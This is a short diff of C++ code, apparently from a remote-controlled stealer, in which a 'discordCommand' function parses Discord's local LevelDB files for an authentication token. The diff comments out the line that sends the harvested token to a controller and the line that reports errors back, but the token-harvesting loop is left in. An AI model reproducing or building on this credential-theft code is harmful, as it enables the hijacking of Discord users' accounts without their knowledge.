@@ -107,13 +107,13 @@ int discordCommand(Controller *ctrl, DiscordCommand cmd) {
 					string& token = parseLDB(p.path().string());
 					if (token.size() != 0) {
 						gotToken = true;
-						ctrl->sendOut(token);
+						//ctrl->sendOut(token);
 					}
 				}
 			}
 			return !gotToken;
 		} catch (filesystem::filesystem_error &ex) {
-			ctrl->sendErr(ex.what());
+			//ctrl->sendErr(ex.what());
 			return -2;
 		}
 	}
